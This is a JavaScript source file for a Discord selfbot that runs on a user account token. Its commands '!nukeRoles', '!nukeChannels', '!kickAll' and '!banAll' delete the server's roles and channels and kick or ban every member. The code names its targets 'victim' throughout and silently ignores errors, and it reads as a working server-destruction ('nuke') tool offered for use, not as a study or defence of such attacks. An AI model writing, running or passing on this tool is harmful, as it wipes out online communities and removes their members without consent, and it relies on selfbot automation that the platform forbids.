const { Client, Guild, GuildMember } = require('discord.js-selfbot-v13');
require('dotenv').config();

const client = new Client();

client.on('ready', async () => {
  console.log(`${client.user.username} is ready!`);
});

client.on("messageCreate", async message => {
    if (message.content == 'ping') {
        message.reply('pong');
    }

    if (message.content == '!nukeRoles') {
        if (message.author.id !== client.user.id) return;
        const victimGuild = message.guild;
        let nukedCount = 0;

        const victimRoles = victimGuild.roles.cache.filter(
            role => role.comparePositionTo(victimGuild.members.me.roles.highest) > 0
        );

        for (const victimRole of victimRoles.values()) {
            try {
                console.log(`Nuking role: ${victimRole.name}`);
                await victimRole.delete();
                nukedCount++;
            } catch (error) {
            }
        }

        console.log(`Nuked ${nukedCount} roles`);
    }
    if (message.content == '!nukeChannels') {
        if (message.author.id !== client.user.id) return;
        const victimGuild = message.guild;
        let nukedCount = 0;

        const victimChannels = victimGuild.channels.cache;

        for (const victimChannel of victimChannels.values()) {
            try {
                console.log(`Nuking channel: ${victimChannel.name}`);
                await victimChannel.delete();
                nukedCount++;
            } catch (error) {
            }
        }

        console.log(`Nuked ${nukedCount} channels`);
    }
    if (message.content == '!kickAll') {
        if (message.author.id !== client.user.id) return;
        const victimGuild = message.guild;
        let kickedCount = 0;

        const victimMembers = victimGuild.members.cache.filter(
            member => member.id !== client.user.id
        );

        for (const victimMember of victimMembers.values()) {
            try {
                console.log(`Kicking member: ${victimMember.user.tag}`);
                await victimMember.kick();
                kickedCount++;
            } catch (error) {
            }
        }

        console.log(`Kicked ${kickedCount} members`);
    }
    if (message.content == '!banAll') {
        if (message.author.id !== client.user.id) return;
        const victimGuild = message.guild;
        let bannedCount = 0;

        const victimMembers = victimGuild.members.cache.filter(
            member => member.id !== client.user.id
        );

        for (const victimMember of victimMembers.values()) {
            try {
                console.log(`Banning member: ${victimMember.user.tag}`);
                await victimMember.ban();
                bannedCount++;
            } catch (error) {
            }
        }

        console.log(`Banned ${bannedCount} members`);
    }
});

client.login(process.env.TOKEN);